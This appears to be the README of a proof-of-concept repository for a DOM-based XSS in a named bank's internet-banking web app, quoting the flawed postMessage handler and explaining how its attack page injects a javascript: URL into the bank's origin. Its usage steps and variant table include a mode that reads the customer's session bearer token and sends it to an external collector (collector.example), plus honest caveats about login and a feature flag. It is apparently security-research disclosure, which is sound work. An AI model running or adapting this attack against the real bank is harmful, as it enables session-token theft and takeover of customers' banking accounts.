# DBS Internet Banking — unvalidated `postMessage` → `javascript:` XSS

Proof of concept for a DOM-based XSS in the DBS Singapore Internet-Banking origin.

* **Asset**: `https://internet-banking.dbs.com.sg/digi-web/ngib/` (React SPA)
* **Vulnerable view**: `/digi-web/ngib/cul-onboarding` — *Apply for DBS Chromo Card*
* **Defect**: the page's `message` handler accepts `{type:'REDIRECT_TO_SINGPASS', source:'mfe'}` from
  any window, from any origin, and assigns `e.data.url` to `window.top.location.href`. No
  `e.origin` / `e.source` validation and no protocol allow-list — a `javascript:` URL therefore executes
  in the bank origin. The sibling branch of the *same* handler does validate `e.origin`, so this is a
  logic omission, not a design decision.

## Vulnerable code (production, unmodified)

`static/js/8333.0883565b.chunk.js`, webpack module `38241`:

```js
var k = { …, redirectToSingpass: "REDIRECT_TO_SINGPASS" };

var e = function (e) {
  var t, i, o;
  if ("object" !== typeof e.data ||
      e.data?.type !== k.redirectToSingpass ||
      "mfe"   !== e.data?.source) {
      /* every other message: sender IS validated */
      if (nn) {
        try { var a = new URL(nn).origin; if (e.origin !== a) return } catch (s) { return }
      }
      … MAP_* / HOAP_* handling …
  } else {
      /* REDIRECT_TO_SINGPASS: no origin, no source, no protocol check */
      pn.store();
      try {
        var r = e.data.url;
        window.top ? window.top.location.href = r : window.parent.location.href = r;
      } catch (d) {}
  }
};
window.addEventListener("message", e);
```

The legitimate sender is the Chromo micro-frontend on `www.dbs.com.sg`:

```js
requestSingpassRedirect(e) {
  return window.parent.postMessage({type:"REDIRECT_TO_SINGPASS", url:e, source:"mfe"}, this.parentOrigin);
}
```

It does pass a `targetOrigin` — the receiving side is what ignores the sender.

## Using this PoC

1. Open `index.html` (or `poc.html` directly), allow pop-ups.
2. The page calls `window.open('https://internet-banking.dbs.com.sg/digi-web/ngib/')` — the real
   login page, real certificate — and keeps the `WindowProxy`.
3. Sign in inside that window, then open **Apply for a DBS Chromo Card** in it.
4. The page has been sending one `postMessage` every 400 ms all along; the moment the card view
   mounts, the handler navigates itself to the `javascript:` payload and the dialog fires **in the DBS
   origin**.

Variants:

| URL | payload |
|---|---|
| `poc.html` | `alert('XSS in the iBanking origin: '+document.domain)` + `document.title='PWNED_BY_OPENER'` |
| `poc.html?p=steal` | reads `redux.auth.tokenId` (the value the SPA sends as `Authorization: Bearer …`) through the React fiber tree, shows it in the dialog, optionally posts it to `?hook=` |
| `poc.html?p=steal&hook=https://collector.example/hit` | same, plus exfiltration |
| `poc.html?target=<url>` | open a different bank URL |
| `poc.html?auto=0` | do not auto-start (click the button instead) |

The page also works from `file://` (no hosting required) — an attacker-opened window accepts
`postMessage` from any origin, including `null`.

## Honest preconditions and caveats

* **The vulnerable view is a post-login route.** The route guard is a client-side redux check on
  `auth.tokenId`; the session is an in-memory bearer token (nothing auth-related in
  `localStorage`/`sessionStorage` at boot), so a window opened by navigation cannot inherit it.
  This is why the tester has to sign in *inside* the window the PoC opens.
* **Feature flag.** The view only stays mounted when
  `featureFlags.featureFlagsSuccess.isYoungAdultCardMVP1Enabled === 'true'` (the flag is served by
  `/IBNG/channels/feature-flags`, which answers `401 messageCode 1011` without a session, so its
  production value cannot be read anonymously). With the flag forced on, the sink fires reliably in
  testing; with it off the page deeplinks away and the handler is not registered. If the flow is dark
  for the test account, the vulnerability is latent rather than exploitable.
* **`javascript:` needs the bank page to be the top-level document** — the sink always targets
  `window.top`, and `X-Frame-Options: SAMEORIGIN` prevents framing anyway.
* No credentials of any DBS customer were used. Verified in testing by emulating the authenticated
  state (the SPA's own `HARD_TOKEN_LOGIN_SUCCESS` action + its own router navigation).

## Files

| file | purpose |
|---|---|
| `index.html` | landing / instructions |
| `poc.html` | the attack page (self-contained, no dependencies) |
| `.nojekyll` | serve files verbatim on GitHub Pages |
| `README.md` | this document |
